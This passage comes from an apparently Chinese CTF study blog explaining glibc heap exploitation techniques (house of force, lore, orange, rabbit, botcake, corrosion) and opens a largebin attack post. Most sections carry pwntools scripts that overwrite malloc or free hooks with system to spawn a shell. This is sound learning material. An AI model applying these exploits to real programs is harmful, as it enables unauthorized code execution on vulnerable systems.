class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">gadget_addr = libc_base + gadget[<span class="number">2</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(gadget_addr))</span><br><span class="line">bug()</span><br><span class="line">p.readuntil(<span class="string">&quot;(CMD)&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;Q&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="2-house-of-froce"><a href="#2-house-of-froce" class="headerlink" title="2.house  of  froce"></a>2.house  of  froce</h2><p>控制top_chunk的地址</p>
<p>top_chunk的size位大小有显示，我们只能申请堆块在堆得内存区域，而申请不到在bss段上（bss段在堆得下方，所以永远申请不到），如果我们改变top_chunk的size位使他为-1（0xffffffffffffffff），我们就可以申请一个超级大的堆块，使他转一圈转到bss段上</p>
<p>在2.23和2.27的libc版本中，由于没有对top chunk的size合法性进行检查，因此如果我们能够通过堆溢出控制top chunk的size位为-1</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748522864101-d43e86bb-ef44-4061-a253-a3ab3b93df65.png" alt="img"></p>
<p>如何计算：</p>
<p>req &#x3D; dest-old_top - 0x20(0x10)</p>
<p>dest就是我们将要写入的地址</p>
<p>1.如何修改top_chunk的size位</p>
<p>申请一个挨着top_chunk的堆块堆溢出就可以修改</p>
<p>2.需要泄露出top_chunk的地址，这道题直接打印出每个堆块的指针的地址，通过紧挨着top_chunk那个堆块就可以算出</p>
<p>3.这道题打malloc_hook，为什么没有用ogg</p>
<p>因为知道指针的地址，也就知道&#x2F;bin&#x2F;sh写入的地址，将malloc_hook改为system，申请堆块时候，写上&#x2F;bin&#x2F;sh的地址就可以（或者通过realloc调整栈帧）</p>
<p><strong>例题：gyctf_2020_force</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;aaaa&#x27;</span>)+<span class="number">0x200ff0</span></span><br><span class="line">malloc = libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base-&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload =p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">top_chunk = add(<span class="number">0x10</span>,payload)+<span class="number">0x10</span></span><br><span class="line">req = malloc -top_chunk-<span class="number">0x20</span></span><br><span class="line">add(req,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(system))</span><br><span class="line">p.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(top_chunk))</span><br></pre></td></tr></table></figure>

<h2 id="3-house-of-lore"><a href="#3-house-of-lore" class="headerlink" title="3.house  of  lore"></a>3.house  of  lore</h2><p>主要就是围绕smallbin的</p>
<p>1.堆块如何进入smallbin，当unsortbin中有一个堆块，在申请一个堆块，大于unsortbin中的堆块，且unsortbin中的堆块不能合并，或者合并后也达不到大小，就会把unsortbin放入smallbin当中</p>
<p>2.如何伪造堆块到smallbin中</p>
<p>首先申请一个0x100的堆块</p>
<p>在栈上伪造两个堆块，伪造他们的fd与bk，就像下面的一样</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748957521841-8b4f949c-6e68-42fc-bc97-3780236364c2.png" alt="img"></p>
<p>就像这样，然后将victim free掉(在这之前再申请一个堆块，防止与top chunk合并)，他会进入unsortbin，然后，在申请一个大于他的堆块，他就会进入smallbin，然后再修改victim的bk指针，这时栈上的两个假的堆块就会进入smallbin中</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748957145325-3f0ac31d-cb53-4aca-a2f1-ef35e9f478be.png" alt="img"></p>
<p>然后我们再申请一个，victim就会被申请出来，smallbin先进先出，再申请一个，栈地址上的堆块就可以申请出来，就可以写数据，覆盖返回地址</p>
<h2 id="4-House-of-Orange"><a href="#4-House-of-Orange" class="headerlink" title="4.House of Orange"></a>4.House of Orange</h2><p><strong>概述</strong> <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/#_2"><strong>¶</strong></a></p>
<p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p>
<p><strong>原理</strong> <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/#_3"><strong>¶</strong></a></p>
<p>如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
<p>我们总结一下伪造的 top chunk size 的要求</p>
<ol>
<li>伪造的 size 必须要对齐到内存页（addr+size是0x1000（4kb）对齐的）</li>
</ol>
<p>因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size</p>
<ol>
<li>size 要大于 MINSIZE(0x10)</li>
<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
<li>size 的 prev inuse 位必须为 1</li>
</ol>
<p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p>
<h2 id="5-house-of-rabbit"><a href="#5-house-of-rabbit" class="headerlink" title="5.house  of   rabbit"></a>5.house  of   rabbit</h2><p>利用触发 malloc consolidate，将fastbin的堆块放入unsortbin时候不会对size位进行检查，来实现堆叠</p>
<p>触发malloc consolidate条件</p>
<p>1.fastbin当中没有合适大小的堆块，先合并，合并不够就会被放入unsortbin（smallbin）这时不会对size位进行检查就触发堆叠了</p>
<p>2.top chunk不够了</p>
<h2 id="6-house-of-botcake"><a href="#6-house-of-botcake" class="headerlink" title="6.house of botcake"></a>6.house of botcake</h2><p><strong>glibc2.29～glibc2.31</strong>，tcache加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效，所以自然就有了绕过方法，绕过方法其中比较典型的就是 house of botcake，他的本质也是通过 UAF 来达到绕过的目的</p>
<p>当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的 <code>key == tcache_key</code> ， 就会遍历<strong>这个大小</strong>的 Tcache ，假如发现同地址的堆块，则触发 Double Free 报错。</p>
<p>从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：</p>
<p>之前只是检查链表的上一个，这次是检查全部的链表</p>
<p>从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：</p>
<ol>
<li>破坏掉被 free 的堆块中的 key，绕过检查（常用）</li>
<li>改变被 free 的堆块的大小，遍历时进入另一 idx 的 entries</li>
<li><strong>House of botcake</strong>（常用没有edit）</li>
</ol>
<p>1.free后用uaf改bk，然后就可以再次free</p>
<p>2没学</p>
<p>3.House of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   free(i)   </span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">system = libc_base +libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x101</span>)+p64(free_hook)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x150</span>,payload)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x100</span>,p64(system))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   free(i) </span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>堆块8进入unsortbin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(7)</span><br></pre></td></tr></table></figure>

<p>堆块8与堆块7合并</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(0x100)</span><br></pre></td></tr></table></figure>

<p>tcachebin中就空出来一个</p>
<p>然后再次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(8)</span><br></pre></td></tr></table></figure>

<p>这时8被free两次，一次在unsortbin中，另一次在tcachebin中，而且形成堆叠，8在7这个合并的大堆块中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(11,0x150,payload)</span><br></pre></td></tr></table></figure>

<p>申请一个大堆块，改堆块8的fd</p>
<p>tcachebin attack</p>
<p>提问：为什么不能先free(7)后free(8)</p>
<p>因为后面double free free(7),unsortbin链表就被破坏了</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1757952795005-e27058c9-e98c-4543-9fe4-eb59f25a22a3.png" alt="img"></p>
<p>更高版本没有edit  tcachebin attack</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   free(i)   </span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x210</span>,<span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x100</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x110</span>+p64(fd))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>7,8堆块合并进入unsortbin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(10,0x210,b&#x27;\x10&#x27;)</span><br></pre></td></tr></table></figure>

<p>将他两个申请出来，但是有uaf，所以7堆块和10堆块的指针指向同一块地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(11,0x100,b&#x27;/bin/sh\x00&#x27;)</span><br></pre></td></tr></table></figure>

<p>将tachebin空出来一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(8)</span><br></pre></td></tr></table></figure>

<p>进入tachebin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(10)</span><br><span class="line">add(12,0x210,b&#x27;a&#x27;*0x120)</span><br></pre></td></tr></table></figure>

<p>free10，又将10申请出来，12就可以覆盖到8</p>
<h2 id="7-House-of-Corrosion"><a href="#7-House-of-Corrosion" class="headerlink" title="7.House-of-Corrosion"></a>7.House-of-Corrosion</h2><p>通过改bins的大小限制，使他可以存无限大的堆块的指针（就是往后面存），从而实现往任意地址写一个堆指针</p>
<p>但是只能在管理堆bins的后面</p>
<p>首先我们要修改bins的大小（任意地址写，unsortbinattack等）</p>
<h3 id="例子1：fastbin"><a href="#例子1：fastbin" class="headerlink" title="例子1：fastbin"></a>例子1：fastbin</h3><p>​           fastbinY[0]&#x3D;0x7ffff07dcfc50</p>
<p>​          _IO_list_all&#x3D;0x7ffff07dd06c0</p>
<p>chunk size &#x3D; (delta * 2) + 0x20 ，delta为目标地址与fastbinY的offset</p>
<p>在这个例子中，chunk大小应该是(0x7ffff7dd06c0-0x7ffff7dcfc50)*2+0x20&#x3D;0x1500字节</p>
<h3 id="例子2：tcachebin"><a href="#例子2：tcachebin" class="headerlink" title="例子2：tcachebin"></a>例子2：tcachebin</h3><p>改mp_.tcache_bins &#x3D; obstack_exit_failure-0x20</p>
<p>mp_.tcache_bins &#x3D; libc.sym[‘obstack_exit_failure’]+libc_base</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15532">https://xz.aliyun.com/news/15532</a></p>
<p>​             entries[0] &#x3D; 0x555555605090</p>
<p>​             因为他这个是在堆上，所以我们可以直接让他在第一个堆块里面，然后改他为free_hook,然后再申请出来就可以了</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1759422664902-1fef5cb8-46f3-4122-bc81-51ed631cb46f.png" alt="img"></p>
<p>我们将这个本来是0x40改成一个大的值之后当申请大的堆块他也会进入tcachebin，然后他的指针就会被存起来，在这个初始化堆块，0x5090就是存大小为0x20链表头的堆块指针，依次往后所以我们申请一个大堆块，他的指针就会往后面写，写道我们申请的第一个堆块我们就可以利用第一个堆块修改它</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1759422804791-e0f3d4ab-59bf-4f48-ac1d-0e14a83a3a6c.png" alt="img"></p>
<p>free大堆块之后</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1759422623334-4506a2b0-3bae-4032-9fe6-5f835eef6198.png" alt="img"></p>
<p>但是bins里面不会有，但是它实际上是有的</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1759422981366-fbc6d4b6-8770-4e40-97d3-b6be5e81735d.png" alt="img"></p>
<p>所以我们改成free_hook之后，直接申请就可以申请出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)<span class="comment">#1</span></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">tcache_bins = libc.sym[<span class="string">&#x27;obstack_exit_failure&#x27;</span>]+libc_base-<span class="number">0x20</span></span><br><span class="line">p.send(p64(tcache_bins)+p64(tcache_bins)*<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">bug()</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(free_hook))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">add(<span class="number">0x500</span>,p64(system))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/Largebin-Attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="和方煜">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小小pwn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/18/Largebin-Attack/" class="post-title-link" itemprop="url">Largebin Attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-11-18 12:48:59 / 修改时间：12:51:33" itemprop="dateCreated datePublished" datetime="2025-11-18T12:48:59+08:00">2025-11-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <hr>
<h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><h2 id="Large-Bin结构"><a href="#Large-Bin结构" class="headerlink" title="Large Bin结构"></a>Large Bin结构</h2><p>large bin中一共包括63个bin，每个bin中的chunk大小不一致，而是出于一定区间范围内。此外这63个bin被分成了6组，每组bin中的chunk之间的公差一致</p>
<p>按范围递增（范围随 index 扩大）：<br><code>- index 0~3：0x400~0x800 字节- index 4~59：0x800~ 几 KB- index 60~62：几 MB 至更大</code></p>
<p>大于512（1024）字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的</p>
<p>被释放进Large Bin中的chunk，除了以前经常见到的<code>prev_size、size、fd、bk</code>之外，还具有<code>fd_nextsize</code>和<code>bk_nextsize:</code></p>
<p><code>fd_nextsize，bk_nextsize：</code>只有chunk可先的时候才使用，不过用于较大的chunk（large chunk）</p>
<p><code>fd_nextsize</code>指向下一个与当前chunk大小不同的（小的）第一个空闲块，不包含bin的头指针</p>
<p><code>bk_nextsize</code>指向上一个与当前chunk大小不同的（大的）第一个空闲块，不包含bin的头指针</p>
<p>这里下一个上一个相较于链表头部，链表头部往下堆块的地址变小</p>
<ul>
<li><code>fd_nextsize</code> 方向 → <strong>size 递减</strong></li>
<li><code>bk_nextsize</code> 方向 → <strong>size 递增</strong></li>
</ul>
<p>一般空闲的large chunk在fd的遍历顺序中，按照由大到小的顺序排列。这样可以避免在寻找合适chunk时挨个遍历</p>
<h2 id="Large-Bin的插入顺序"><a href="#Large-Bin的插入顺序" class="headerlink" title="Large Bin的插入顺序"></a>Large Bin的插入顺序</h2><p>在index相同的情况下：</p>
<p><strong>1、</strong>按照大小，从大到小排序（小的链接<code>large bin</code>块）</p>
<p><strong>2、</strong>如果大小相同，按照<code>free</code>的时间排序</p>
<p><strong>3、</strong>多个大小相同的堆块，只有首堆块的<code>fd_nextsize</code>和<code>bk_nextsize</code>会指向其他堆块，后面的堆块的<code>fd_nextsize</code>和<code>bk_nextsize</code>均为0</p>
<p><strong>4、</strong><code>size</code>最大的chunk的<code>bk_nextsize</code>指向最小的<code>chunk</code>，<code>size</code>最小的chunk的<code>fd_nextsize</code>指向最大的<code>chunk</code></p>
<p>我们从链表头部开始遍历，直到找到第一个 size 大于等于待插入 chunk 的链表，找到后判断链表的 size 是否等于待插入chunk的size，如果相等，直接将这个 chunk 插入到当前链表的第二个位置，如果不相等，说明待插入的chunk比当前链表头结点的 size 大，那么我们将待插入的chunk作为当前链表的头结点，插入到符合size的bin index后</p>
<p><img src="/2025/11/18/Largebin-Attack/1756744615678-0266e16d-931c-4512-be32-b04dfd4d4969.png" alt="img"></p>
<h2 id="例：how2heap"><a href="#例：how2heap" class="headerlink" title="例：how2heap"></a>例：how2heap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> // gcc -g -no-pie hollk.c -o hollk</span><br><span class="line"> <span class="number">2</span> <span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"> <span class="number">3</span> <span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"> <span class="number">4</span> </span><br><span class="line"> <span class="number">5</span> <span class="built_in">int</span> main()</span><br><span class="line"> <span class="number">6</span> &#123;</span><br><span class="line"> <span class="number">7</span> </span><br><span class="line"> <span class="number">8</span>     unsigned long stack_var1 = <span class="number">0</span>;</span><br><span class="line"> <span class="number">9</span>     unsigned long stack_var2 = <span class="number">0</span>;</span><br><span class="line"><span class="number">10</span> </span><br><span class="line"><span class="number">11</span>     fprintf(stderr, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line"><span class="number">12</span>     fprintf(stderr, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"><span class="number">13</span> </span><br><span class="line"><span class="number">14</span>     unsigned long *p1 = malloc(<span class="number">0x320</span>);</span><br><span class="line"><span class="number">15</span>     malloc(<span class="number">0x20</span>);</span><br><span class="line"><span class="number">16</span>     unsigned long *p2 = malloc(<span class="number">0x400</span>);</span><br><span class="line"><span class="number">17</span>     malloc(<span class="number">0x20</span>);</span><br><span class="line"><span class="number">18</span>     unsigned long *p3 = malloc(<span class="number">0x400</span>);</span><br><span class="line"><span 